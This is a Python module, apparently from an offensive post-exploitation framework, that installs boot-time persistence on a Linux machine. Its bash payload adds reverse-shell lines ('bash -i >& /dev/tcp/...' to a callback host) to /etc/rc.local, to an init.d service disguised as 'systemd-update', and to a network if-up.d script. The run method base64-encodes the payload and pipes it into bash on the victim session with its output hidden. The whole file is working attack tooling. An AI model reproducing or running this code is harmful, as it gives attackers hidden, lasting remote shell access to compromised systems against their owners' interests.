"""Startup scripts persistence."""

from ..base import OperatorScript, ScriptResult


class StartupScripts(OperatorScript):
    """Install persistence via system startup scripts."""
    
    name = "Startup Scripts"
    description = "Install persistence via /etc/rc.local and equivalents"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] STARTUP SCRIPTS PERSISTENCE"
echo "==============================="
echo ""

CALLBACK="${CALLBACK_HOST:-192.168.1.100:4444}"

echo "[+] Installing via /etc/rc.local..."
RC_LOCAL="/etc/rc.local"

if [ ! -f "$RC_LOCAL" ]; then
    echo "[*] Creating $RC_LOCAL"
    cat > "$RC_LOCAL" 2>/dev/null <<'EOF'
#!/bin/bash
exit 0
EOF
    chmod +x "$RC_LOCAL" 2>/dev/null
fi

if [ -f "$RC_LOCAL" ]; then
    sed -i '/^exit 0/d' "$RC_LOCAL" 2>/dev/null
    
    cat >> "$RC_LOCAL" 2>/dev/null <<EOF
bash -c 'bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1' &
exit 0
EOF
    
    chmod +x "$RC_LOCAL" 2>/dev/null && \
        echo "[+] Backdoor added to $RC_LOCAL" || \
        echo "[-] Could not modify $RC_LOCAL"
else
    echo "[-] Could not create/modify $RC_LOCAL (need root)"
fi

echo ""
echo "[+] Installing via init.d..."
INITD_SCRIPT="/etc/init.d/systemd-update"
cat > "$INITD_SCRIPT" 2>/dev/null <<'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          systemd-update
# Required-Start:    $network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System update service
### END INIT INFO

case "$1" in
  start)
    bash -c 'bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT 0>&1' &
    ;;
  stop|restart|status)
    ;;
esac
exit 0
EOF

if [ -f "$INITD_SCRIPT" ]; then
    chmod +x "$INITD_SCRIPT" 2>/dev/null
    update-rc.d systemd-update defaults 2>/dev/null
    echo "[+] Init.d script created and enabled"
else
    echo "[-] Could not create init.d script"
fi

echo ""
echo "[+] Installing via /etc/rc*.d/..."
for dir in /etc/rc2.d /etc/rc3.d /etc/rc4.d /etc/rc5.d; do
    if [ -d "$dir" ]; then
        ln -s /etc/init.d/systemd-update "$dir/S99systemd-update" 2>/dev/null && \
            echo "[+] Linked in: $dir"
    fi
done

echo ""
echo "[+] Installing via /etc/network/if-up.d/..."
IFUP_SCRIPT="/etc/network/if-up.d/upstart"
cat > "$IFUP_SCRIPT" 2>/dev/null <<EOF
#!/bin/bash
if [ "\$IFACE" = "eth0" ]; then
    bash -c 'bash -i >& /dev/tcp/${CALLBACK//:/ } 0>&1' &
fi
EOF

if [ -f "$IFUP_SCRIPT" ]; then
    chmod +x "$IFUP_SCRIPT" 2>/dev/null
    echo "[+] Network interface startup script created"
fi

echo ""
echo "[+] Verifying rc.local service:"
systemctl status rc-local 2>/dev/null || echo "[-] rc-local service not available"

echo ""
echo "[+] Persistence installed!"
echo "    Triggers: System boot / network up"
echo "    Callback: $CALLBACK"
echo "    Locations: rc.local, init.d, if-up.d"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Installing startup scripts...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Startup scripts installation executed",
                metadata={"script": "startup_scripts"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
